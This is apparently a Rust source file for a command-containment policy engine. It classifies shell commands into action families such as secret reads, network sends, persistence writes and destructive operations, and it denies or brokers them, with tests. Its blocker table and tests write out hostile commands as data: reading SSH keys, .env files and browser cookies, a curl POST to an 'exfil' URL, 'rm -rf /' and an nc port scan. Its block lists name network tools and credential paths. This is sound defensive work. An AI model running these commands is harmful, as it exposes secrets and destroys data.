use std::collections::BTreeMap;

use crate::{
    ActionFamily, ActorType, BehaviorDecision, BehaviorRequest, CanonicalCommand, DataClass,
    DestinationContext, PolicyOutcome, TrustState,
};
use uuid::Uuid;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DemoSecurityBlocker {
    SshOriginalCommandBypass,
    SecretFileReadEnv,
    SecretFileReadSsh,
    SshAgentTouch,
    BrowserSessionAccess,
    NetworkExfilTooling,
    PersistenceWrite,
    DestructiveOp,
    PublishAbuse,
    InterpreterEvasion,
    RepoOpenConfigAbuse,
    InternalReconPortScan,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct DemoShellBlockerSpec {
    pub blocker: DemoSecurityBlocker,
    pub command: &'static str,
    pub expected_action_family: ActionFamily,
    pub expected_outcome: PolicyOutcome,
    pub expected_reason: &'static str,
    pub expected_rule: &'static str,
}

const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::SshOriginalCommandBypass,
        command: "bash -lc 'echo bypass-attempt'",
        expected_action_family: ActionFamily::ProcessExec,
        expected_outcome: PolicyOutcome::BrokerOnly,
        expected_reason: "command requires broker mediation",
        expected_rule: "process-exec-broker-only",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::SecretFileReadEnv,
        command: "cat .env",
        expected_action_family: ActionFamily::SecretRead,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "containment denied a sensitive read",
        expected_rule: "secret-read-default-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::SecretFileReadSsh,
        command: "cat ~/.ssh/id_ed25519",
        expected_action_family: ActionFamily::SecretRead,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "containment denied a sensitive read",
        expected_rule: "secret-read-default-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::SshAgentTouch,
        command: "ssh-add -L",
        expected_action_family: ActionFamily::SecretRead,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "containment denied a sensitive read",
        expected_rule: "secret-read-default-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::BrowserSessionAccess,
        command: "cat /home/z/.config/google-chrome/Default/Cookies",
        expected_action_family: ActionFamily::BrowserStateRead,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "repo-open and browser-state actions are not yet supported for execution",
        expected_rule: "repo-open-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::NetworkExfilTooling,
        command: "curl -X POST https://example.com/exfil",
        expected_action_family: ActionFamily::NetSend,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "containment denied direct network tooling",
        expected_rule: "network-direct-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::PersistenceWrite,
        command: "echo hello > ~/.zshrc",
        expected_action_family: ActionFamily::PersistenceWrite,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "containment denied a persistence write",
        expected_rule: "persistence-write-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::DestructiveOp,
        command: "rm -rf /home/z/workspace",
        expected_action_family: ActionFamily::DestructiveOp,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "high-blast-radius action denied",
        expected_rule: "high-blast-radius-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::PublishAbuse,
        command: "npm publish",
        expected_action_family: ActionFamily::Publish,
        expected_outcome: PolicyOutcome::Unsupported,
        expected_reason: "publish actions require a future brokered path",
        expected_rule: "publish-broker-required",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::InterpreterEvasion,
        command: "python -c \"import os; os.system('curl https://example.com')\"",
        expected_action_family: ActionFamily::NetSend,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "containment denied direct network tooling",
        expected_rule: "network-direct-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::RepoOpenConfigAbuse,
        command: "cat .mcp.json",
        expected_action_family: ActionFamily::RepoOpenConfig,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "repo-open and browser-state actions are not yet supported for execution",
        expected_rule: "repo-open-deny",
    },
    DemoShellBlockerSpec {
        blocker: DemoSecurityBlocker::InternalReconPortScan,
        command: "nc -vz 10.0.0.1 22 80 443",
        expected_action_family: ActionFamily::NetSend,
        expected_outcome: PolicyOutcome::Deny,
        expected_reason: "containment denied direct network tooling",
        expected_rule: "network-direct-deny",
    },
];

pub fn demo_shell_blocker_specs() -> &'static [DemoShellBlockerSpec] {
    DEMO_SHELL_BLOCKERS
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SessionContext {
    pub session_id: Uuid,
    pub actor_type: ActorType,
    pub session_trust_state: TrustState,
    pub repo_trust_state: TrustState,
    pub cwd: String,
    pub user: String,
}

impl SessionContext {
    pub fn from_env() -> Self {
        Self {
            session_id: Uuid::new_v4(),
            actor_type: ActorType::Human,
            session_trust_state: TrustState::Trusted,
            repo_trust_state: TrustState::Sterile,
            cwd: std::env::var("PWD").unwrap_or_else(|_| "/home/z/workspace".to_string()),
            user: std::env::var("USER").unwrap_or_else(|_| "z".to_string()),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ManagedCommand {
    pub raw: String,
    pub request: BehaviorRequest,
}

#[derive(Debug, Clone)]
pub struct SessionPolicy {
    pub revision: String,
    pub lockdown_mode: crate::types::LockdownMode,
}

impl Default for SessionPolicy {
    fn default() -> Self {
        Self {
            revision: "max-containment-v1".to_string(),
            lockdown_mode: crate::types::LockdownMode::default(),
        }
    }
}

impl SessionPolicy {
    pub fn decide(&self, request: &BehaviorRequest) -> BehaviorDecision {
        let evidence_id = Uuid::new_v4();

        if self.lockdown_mode.is_break_glass() {
            return BehaviorDecision {
                outcome: PolicyOutcome::Allow,
                reason: "break-glass mode overrides standard policy".to_string(),
                matched_rule: "break-glass-override".to_string(),
                evidence_id,
                policy_revision: self.revision.clone(),
            };
        }

        let (outcome, reason, matched_rule) = match request.action_family {
            ActionFamily::SecretRead => {
                if self.lockdown_mode.secret_read_steps_up() {
                    (
                        PolicyOutcome::StepUp,
                        "relaxed mode requires step-up for sensitive read".to_string(),
                        "secret-read-relaxed-stepup".to_string(),
                    )
                } else {
                    (
                        PolicyOutcome::Deny,
                        "containment denied a sensitive read".to_string(),
                        "secret-read-default-deny".to_string(),
                    )
                }
            }
            ActionFamily::NetConnect | ActionFamily::NetSend => (
                PolicyOutcome::Deny,
                "containment denied direct network tooling".to_string(),
                "network-direct-deny".to_string(),
            ),
            ActionFamily::PersistenceWrite => (
                PolicyOutcome::Deny,
                "containment denied a persistence write".to_string(),
                "persistence-write-deny".to_string(),
            ),
            ActionFamily::Publish => {
                if self.lockdown_mode.unsupported_fails_closed() {
                    (
                        PolicyOutcome::Deny,
                        "publish actions denied in sealed mode".to_string(),
                        "publish-sealed-deny".to_string(),
                    )
                } else {
                    (
                        PolicyOutcome::Unsupported,
                        "publish actions require a future brokered path".to_string(),
                        "publish-broker-required".to_string(),
                    )
                }
            }
            ActionFamily::Deploy
            | ActionFamily::IamMutate
            | ActionFamily::DestructiveOp
            | ActionFamily::BreakGlass => (
                PolicyOutcome::Deny,
                "high-blast-radius action denied".to_string(),
                "high-blast-radius-deny".to_string(),
            ),
            ActionFamily::ProcessExec => {
                if is_safe_process_request(request) {
                    (
                        PolicyOutcome::Allow,
                        "command matched the safe allowlist".to_string(),
                        "safe-allowlist".to_string(),
                    )
                } else if self.lockdown_mode.allows_ambiguous_process() {
                    (
                        PolicyOutcome::Allow,
                        "relaxed mode allows ambiguous process execution".to_string(),
                        "process-exec-relaxed-allow".to_string(),
                    )
                } else if self.lockdown_mode.is_sealed() {
                    (
                        PolicyOutcome::Deny,
                        "command is not on the scoped allowlist and is denied in sealed mode"
                            .to_string(),
                        "process-exec-sealed-deny".to_string(),
                    )
                } else {
                    (
                        PolicyOutcome::BrokerOnly,
                        "command requires broker mediation".to_string(),
                        "process-exec-broker-only".to_string(),
                    )
                }
            }
            ActionFamily::RepoOpenConfig
            | ActionFamily::McpServerStart
            | ActionFamily::BrowserStateRead => {
                if self.lockdown_mode.unsupported_fails_closed() {
                    (
                        PolicyOutcome::Deny,
                        "repo and browser actions are denied in sealed mode".to_string(),
                        "repo-open-sealed-deny".to_string(),
                    )
                } else {
                    (
                        PolicyOutcome::Deny,
                        "repo-open and browser-state actions are not yet supported for execution"
                            .to_string(),
                        "repo-open-deny".to_string(),
                    )
                }
            }
        };

        BehaviorDecision {
            outcome,
            reason,
            matched_rule,
            evidence_id,
            policy_revision: self.revision.clone(),
        }
    }
}

pub fn canonicalize_command(ctx: &SessionContext, raw: &str) -> ManagedCommand {
    let lowered = raw.to_ascii_lowercase();
    let interpreter_chain = infer_interpreter_chain(&lowered);
    let action_family = classify_action_family(&lowered);
    let sensitive_paths = infer_sensitive_paths(&lowered);
    let destination = infer_destination(&lowered);
    let data_classes = infer_data_classes(action_family, &sensitive_paths);
    let mut parse_error = validate_command_shape(raw)
        .err()
        .map(|error| error.to_string());
    let parsed_tokens = if parse_error.is_none() {
        match shell_words::split(raw) {
            Ok(tokens) => tokens,
            Err(error) => {
                parse_error = Some(format!("failed to parse protected command: {error}"));
                Vec::new()
            }
        }
    } else {
        Vec::new()
    };
    let (env, argv) = if parse_error.is_none() {
        split_leading_env_assignments(parsed_tokens)
    } else {
        (BTreeMap::new(), Vec::new())
    };
    if parse_error.is_none() && argv.is_empty() {
        parse_error = Some("missing executable after environment assignments".to_string());
    }
    let binary_path = argv
        .first()
        .cloned()
        .unwrap_or_else(|| "/bin/sh".to_string());

    ManagedCommand {
        raw: raw.to_string(),
        request: BehaviorRequest {
            request_id: Uuid::new_v4(),
            actor_type: ctx.actor_type,
            session_id: ctx.session_id,
            action_family,
            session_trust_state: ctx.session_trust_state,
            repo_trust_state: ctx.repo_trust_state,
            command: Some(CanonicalCommand {
                binary_path,
                argv,
                env,
                interpreter_chain,
                inline_eval: contains_inline_eval(&lowered),
                parse_error,
                cwd: ctx.cwd.clone(),
            }),
            sensitive_paths,
            destination,
            data_classes,
        },
    }
}

pub fn classify_action_family(command: &str) -> ActionFamily {
    if touches_browser_state(command) {
        ActionFamily::BrowserStateRead
    } else if touches_repo_open_surface(command) {
        ActionFamily::RepoOpenConfig
    } else if touches_secret_path(command) || touches_ssh_agent(command) {
        ActionFamily::SecretRead
    } else if touches_persistence_path(command) {
        ActionFamily::PersistenceWrite
    } else if touches_publish_path(command) {
        ActionFamily::Publish
    } else if touches_deploy_or_iam(command) {
        if command.contains("iam") {
            ActionFamily::IamMutate
        } else {
            ActionFamily::Deploy
        }
    } else if touches_destructive_path(command) {
        ActionFamily::DestructiveOp
    } else if touches_network_tool(command) {
        ActionFamily::NetSend
    } else {
        ActionFamily::ProcessExec
    }
}

fn touches_secret_path(command: &str) -> bool {
    [
        ".env",
        "~/.ssh",
        "/home/z/.ssh",
        "~/.aws",
        "/home/z/.aws",
        "kubeconfig",
        ".npmrc",
        ".pypirc",
        "terraform.tfstate",
        "authorized_keys",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn touches_ssh_agent(command: &str) -> bool {
    command.contains("ssh-add -l")
        || command.contains("ssh-add -L")
        || command.contains("$ssh_auth_sock")
        || command.contains("$SSH_AUTH_SOCK")
        || command.contains("ssh_auth_sock")
}

fn touches_browser_state(command: &str) -> bool {
    [
        "/.config/google-chrome/",
        "/.config/chromium/",
        "/.mozilla/firefox/",
        "/cookies",
        "local storage",
        "session storage",
        "localstorage",
        "browser session",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn touches_repo_open_surface(command: &str) -> bool {
    [
        ".mcp.json",
        ".claude/",
        "claude.md",
        ".devcontainer/",
        "devcontainer.json",
        "anthropic_base_url",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn touches_network_tool(command: &str) -> bool {
    let tools = [
        "curl ", "wget ", "ncat ", "socat ", "scp ", "rsync ", "sftp ",
    ];
    tools.iter().any(|needle| command.contains(needle))
        || command.starts_with("nc ")
        || command.contains(" nc ")
        || command.contains("'nc ")
        || command.contains("\"nc ")
}

fn touches_persistence_path(command: &str) -> bool {
    [
        ".zshrc",
        ".bashrc",
        ".zprofile",
        ".git/hooks",
        "authorized_keys",
        "crontab",
        "systemd",
        "autostart",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn touches_publish_path(command: &str) -> bool {
    [
        "npm publish",
        "twine upload",
        "cargo publish",
        "docker push",
        "gh release",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn touches_deploy_or_iam(command: &str) -> bool {
    [
        "terraform apply",
        "terraform destroy",
        "kubectl apply",
        "kubectl delete",
        "aws iam",
        "gcloud iam",
        "az role assignment",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn touches_destructive_path(command: &str) -> bool {
    command.contains("rm -rf")
        || command.contains("git push --force")
        || command.contains("git push -f")
}

fn infer_interpreter_chain(command: &str) -> Vec<String> {
    let mut chain = Vec::new();
    for interpreter in ["bash", "sh", "zsh", "python", "node", "busybox"] {
        if command.contains(&format!("{interpreter} -c"))
            || command.contains(&format!("{interpreter} -e"))
            || command.starts_with(&format!("{interpreter} "))
        {
            chain.push(interpreter.to_string());
        }
    }
    chain
}

fn infer_sensitive_paths(command: &str) -> Vec<String> {
    [
        ".env",
        "~/.ssh",
        "/home/z/.ssh",
        "~/.aws",
        "/home/z/.aws",
        "kubeconfig",
        ".npmrc",
        ".pypirc",
        "terraform.tfstate",
        "authorized_keys",
        ".git/hooks",
        ".zshrc",
        ".bashrc",
        "/.config/google-chrome/",
        "/.config/chromium/",
        "/.mozilla/firefox/",
        ".mcp.json",
        ".claude/",
        "claude.md",
        ".devcontainer/",
    ]
    .iter()
    .filter(|needle| command.contains(**needle))
    .map(|needle| needle.to_string())
    .collect()
}

fn infer_destination(command: &str) -> Option<DestinationContext> {
    for marker in ["https://", "http://"] {
        if let Some(index) = command.find(marker) {
            let rest = &command[index + marker.len()..];
            let host = rest
                .split(['/', ' ', ':'])
                .next()
                .unwrap_or_default()
                .to_string();
            return Some(DestinationContext {
                scheme: marker.trim_end_matches("://").to_string(),
                host,
                port: if marker == "https://" { 443 } else { 80 },
                trust_zone: "unknown_external".to_string(),
            });
        }
    }
    None
}

fn infer_data_classes(action_family: ActionFamily, sensitive_paths: &[String]) -> Vec<DataClass> {
    let mut classes = Vec::new();
    if matches!(
        action_family,
        ActionFamily::SecretRead | ActionFamily::Publish
    ) {
        classes.push(DataClass::Credentials);
    }
    if sensitive_paths
        .iter()
        .any(|path| path.contains("terraform") || path.contains("kube"))
    {
        classes.push(DataClass::InfrastructureState);
    }
    if sensitive_paths
        .iter()
        .any(|path| path.contains(".env") || path.contains(".npmrc") || path.contains(".pypirc"))
    {
        classes.push(DataClass::Credentials);
    }
    if sensitive_paths.iter().any(|path| {
        path.contains(".mcp.json")
            || path.contains(".claude/")
            || path.contains("claude.md")
            || path.contains(".devcontainer/")
    }) {
        classes.push(DataClass::ModelAndAgentInternals);
    }
    classes.sort();
    classes.dedup();
    classes
}

fn split_leading_env_assignments(argv: Vec<String>) -> (BTreeMap<String, String>, Vec<String>) {
    let mut env = BTreeMap::new();
    let mut first_command_index = 0;

    for token in &argv {
        if let Some((name, value)) = token.split_once('=') {
            if is_valid_env_name(name) {
                env.insert(name.to_string(), value.to_string());
                first_command_index += 1;
                continue;
            }
        }
        break;
    }

    (env, argv.into_iter().skip(first_command_index).collect())
}

fn is_valid_env_name(name: &str) -> bool {
    let mut chars = name.chars();
    matches!(chars.next(), Some(first) if first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn contains_inline_eval(command: &str) -> bool {
    command.contains(" -c ")
        || command.contains(" -e ")
        || command.starts_with("bash -c ")
        || command.starts_with("bash -e ")
        || command.starts_with("sh -c ")
        || command.starts_with("sh -e ")
        || command.starts_with("zsh -c ")
        || command.starts_with("zsh -e ")
        || command.starts_with("python -c ")
        || command.starts_with("node -e ")
}

fn is_safe_process_request(request: &BehaviorRequest) -> bool {
    let Some(command) = &request.command else {
        return false;
    };
    if command.parse_error.is_some() || command.inline_eval {
        return false;
    }
    match command.argv.as_slice() {
        [pwd] if pwd == "pwd" => true,
        [truth] if truth == "true" => true,
        [echo, safe] if echo == "echo" && safe == "safe" => true,
        [git, config, list] if git == "git" && config == "config" && list == "--list" => true,
        [git, ls_remote, _target] if git == "git" && ls_remote == "ls-remote" => true,
        _ => false,
    }
}

fn validate_command_shape(raw: &str) -> Result<(), &'static str> {
    if raw.contains('\n') || raw.contains('\r') {
        return Err("multi-line commands are not allowed in protected mode");
    }
    for forbidden in ["&&", "||", ";", "|", ">>", "<<", ">", "<", "$(", "`"] {
        if raw.contains(forbidden) {
            return Err("shell metacharacters require broker-only handling");
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx() -> SessionContext {
        SessionContext::from_env()
    }

    #[test]
    fn canonicalizes_secret_reads() {
        let managed = canonicalize_command(&ctx(), "cat ~/.ssh/id_ed25519");
        assert_eq!(managed.request.action_family, ActionFamily::SecretRead);
        assert!(
            managed
                .request
                .sensitive_paths
                .iter()
                .any(|path| path.contains(".ssh"))
        );
    }

    #[test]
    fn blocks_interpreter_evasion() {
        let policy = SessionPolicy::default();
        let managed = canonicalize_command(
            &ctx(),
            "python -c \"import os; os.system('curl https://example.com')\"",
        );
        assert_eq!(managed.request.action_family, ActionFamily::NetSend);
        assert_eq!(policy.decide(&managed.request).outcome, PolicyOutcome::Deny);
    }

    #[test]
    fn allows_demo_git_probe_commands() {
        let policy = SessionPolicy::default();
        let managed = canonicalize_command(
            &ctx(),
            "GIT_TRACE_CURL=1 git ls-remote http://github.com/example/repo.git",
        );
        assert_eq!(managed.request.action_family, ActionFamily::ProcessExec);
        assert_eq!(
            policy.decide(&managed.request).outcome,
            PolicyOutcome::Allow
        );
    }

    #[test]
    fn validates_additional_commands() {
        let policy = SessionPolicy::default();
        let managed = canonicalize_command(&ctx(), "cat .env");
        assert_eq!(managed.request.action_family, ActionFamily::SecretRead);

        let managed = canonicalize_command(&ctx(), "curl https://example.com");
        assert_eq!(managed.request.action_family, ActionFamily::NetSend);

        let managed = canonicalize_command(&ctx(), "echo hello > ~/.zshrc");
        assert_eq!(
            managed.request.action_family,
            ActionFamily::PersistenceWrite
        );

        let managed = canonicalize_command(&ctx(), "npm publish");
        assert_eq!(managed.request.action_family, ActionFamily::Publish);

        let managed = canonicalize_command(&ctx(), "rm -rf /home/z/workspace");
        assert_eq!(managed.request.action_family, ActionFamily::DestructiveOp);

        let managed = canonicalize_command(&ctx(), "git config --list");
        assert_eq!(managed.request.action_family, ActionFamily::ProcessExec);
        assert_eq!(
            policy.decide(&managed.request).outcome,
            PolicyOutcome::Allow
        );

        let managed = canonicalize_command(&ctx(), "bash -lc 'echo bypass-attempt'");
        assert_eq!(managed.request.action_family, ActionFamily::ProcessExec);
        assert_eq!(
            policy.decide(&managed.request).outcome,
            PolicyOutcome::BrokerOnly
        );
    }

    #[test]
    fn sealed_mode_denies_unknown_process_exec() {
        let policy = SessionPolicy {
            lockdown_mode: crate::types::LockdownMode::Sealed,
            ..Default::default()
        };
        let managed = canonicalize_command(&ctx(), "bash -lc 'echo unknown'");
        assert_eq!(managed.request.action_family, ActionFamily::ProcessExec);
        assert_eq!(policy.decide(&managed.request).outcome, PolicyOutcome::Deny);
    }

    #[test]
    fn relaxed_mode_allows_unknown_process_exec_with_warn() {
        let policy = SessionPolicy {
            lockdown_mode: crate::types::LockdownMode::Relaxed,
            ..Default::default()
        };
        let managed = canonicalize_command(&ctx(), "bash -lc 'echo unknown'");
        assert_eq!(managed.request.action_family, ActionFamily::ProcessExec);
        let decision = policy.decide(&managed.request);
        assert_eq!(decision.outcome, PolicyOutcome::Allow);
        assert!(decision.reason.contains("relaxed mode allows"));
    }

    #[test]
    fn break_glass_mode_allows_all_with_evidence() {
        let policy = SessionPolicy {
            lockdown_mode: crate::types::LockdownMode::BreakGlass,
            ..Default::default()
        };
        let managed1 = canonicalize_command(&ctx(), "cat ~/.ssh/id_rsa");
        assert_eq!(
            policy.decide(&managed1.request).outcome,
            PolicyOutcome::Allow
        );

        let managed2 = canonicalize_command(&ctx(), "rm -rf /");
        assert_eq!(
            policy.decide(&managed2.request).outcome,
            PolicyOutcome::Allow
        );
    }

    #[test]
    fn classifies_browser_and_repo_open_reads() {
        let browser =
            canonicalize_command(&ctx(), "cat /home/z/.config/google-chrome/Default/Cookies");
        assert_eq!(
            browser.request.action_family,
            ActionFamily::BrowserStateRead
        );

        let repo_open = canonicalize_command(&ctx(), "cat .mcp.json");
        assert_eq!(
            repo_open.request.action_family,
            ActionFamily::RepoOpenConfig
        );
    }

    #[test]
    fn classifies_ssh_agent_touches_as_secret_reads() {
        let managed = canonicalize_command(&ctx(), "ssh-add -L");
        assert_eq!(managed.request.action_family, ActionFamily::SecretRead);
    }

    #[test]
    fn demo_shell_blocker_specs_match_policy() {
        let ctx = ctx();
        let policy = SessionPolicy::default();

        for spec in demo_shell_blocker_specs() {
            let managed = canonicalize_command(&ctx, spec.command);
            assert_eq!(managed.request.action_family, spec.expected_action_family);
            let decision = policy.decide(&managed.request);
            assert_eq!(decision.outcome, spec.expected_outcome);
            assert!(
                decision.reason.contains(spec.expected_reason),
                "missing reason for {:?}: {}",
                spec.blocker,
                decision.reason
            );
            assert_eq!(decision.matched_rule, spec.expected_rule);
        }
    }
}
